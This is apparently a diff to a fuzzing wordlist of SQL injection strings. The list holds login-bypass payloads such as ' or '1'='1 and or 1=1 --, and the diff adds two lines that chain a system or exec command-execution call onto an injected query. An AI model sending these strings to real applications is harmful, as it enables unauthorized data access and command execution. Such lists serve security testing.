@@ -1,6 +1,7 @@
 ’ or ‘1’=’1
 ' or '1'='1
-
+'; system('ls'); --
+'; exec('cmd.exe /c dir'); --
  or 1=1 --
  (select top 1
  --
